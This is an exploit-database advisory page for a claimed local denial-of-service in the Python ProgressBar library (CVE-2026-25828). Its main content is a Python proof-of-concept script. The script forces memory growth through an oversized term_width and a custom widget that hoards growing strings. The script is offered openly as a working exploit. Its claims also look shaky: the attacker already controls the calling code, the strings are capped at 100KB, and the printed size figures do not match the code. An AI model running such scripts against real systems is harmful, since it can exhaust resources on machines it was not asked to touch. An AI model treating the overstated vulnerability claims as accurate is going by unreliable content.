---
title: ProgressBar 2 4.5.0 - Unbounded Resource Consumption DoS
url: https://cxsecurity.com/issue/WLB-2026020010
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-02-14
fetch_date: 2026-02-15T04:14:47.286592
---

# ProgressBar 2 4.5.0 - Unbounded Resource Consumption DoS

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **ProgressBar 2 4.5.0 - Unbounded Resource Consumption DoS** **2026.02.14**  Credit:  **[cardosource](https://cxsecurity.com/author/cardosource%2B/1/)**  Risk: **Medium**  Local: ****Yes****  Remote: **No**  CVE: **[2026-25828](https://cxsecurity.com/cveshow/2026-25828/ "Click to see 2026-25828")**  CWE: **N/A** | |

#!/usr/bin/env python3
"""
Exploit Title: ProgressBar 2 4.5.0 - Unbounded Resource Consumption Denial of Service (DoS)
The ProgressBar library for Python (version 2 4.5.0 ) contains multiple
unbounded resource consumption vulnerabilities that allow a local attacker
to cause a Denial of Service (DoS). By providing overly large values for
parameters such as term\_width or maxval, or by using a custom widget that
returns an excessively long string, an attacker can force the library to
allocate massive amounts of memory or perform CPU-intensive calculations,
leading to a process crash or system unresponsiveness.
Tested on: Linux, Windows (Python 3.x)
CVE: CVE-2026-25828
"""
import sys
import os
import time
# Add current directory to path to import the module
sys.path.insert(0, os.path.dirname(\_\_file\_\_))
try:
from progressbar import ProgressBar
from widgets import Percentage, ETA, Bar
print("[\*] ProgressBar 2 4.5.0 DoS Exploit")
print("-" \* 50)
# Attack Vector 1: Memory exhaustion via term\_width
print("[1] Memory exhaustion via term\_width=999999")
pbar1 = ProgressBar(maxval=100, term\_width=999999)
pbar1.start()
for i in range(5):
pbar1.update((i + 1) \* 20)
print(f"Update {i+1} - Allocating ~1MB string")
time.sleep(0.5)
pbar1.finish()
print("[SUCCESS] Memory consumption forced")
# Attack Vector 2: Malicious widget with growing strings
print("\n[2] Malicious widget with exponential string growth")
from progressbar import widgets
class DoSWidget(widgets.Widget):
def \_\_init\_\_(self):
self.size = 1000
self.stored\_strings = [] # Prevent garbage collection
def update(self, pbar):
# Double string size each time (up to 100KB)
self.size = min(self.size \* 2, 100000)
huge\_string = "A" \* self.size
self.stored\_strings.append(huge\_string) # Keep reference
return f"[{len(huge\_string)} bytes]"
pbar2 = ProgressBar(
maxval=15,
widgets=[DoSWidget(), ' ', widgets.Bar()]
)
pbar2.start()
for i in range(15):
pbar2.update(i + 1)
print(f"Update {i+1} - String size: {1000 \* (2 \*\* min(i, 7))} bytes")
time.sleep(0.3)
pbar2.finish()
print("[SUCCESS] Progressive memory allocation demonstrated")
print("\n[+] Exploit completed - Vulnerabilities confirmed")
print("System may experience memory exhaustion or crash")
except MemoryError:
print("\n[!] CRASH: System out of memory!")
sys.exit(137)
except ImportError as e:
print(f"\n[!] Error: {e}")
print("Make sure progressbar files are in the current directory")
sys.exit(1)
except Exception as e:
print(f"\n[!] Unexpected error: {type(e).\_\_name\_\_}: {e}")
sys.exit(1)

**##### References:**

https://pypi.org/project/progressbar/

https://files.pythonhosted.org/packages/19/24/3587e795fc590611434e4bcb9fbe0c3dddb5754ce1a20edfd86c587c0004/progressbar2-4.5.0.tar.gz

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026020010)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top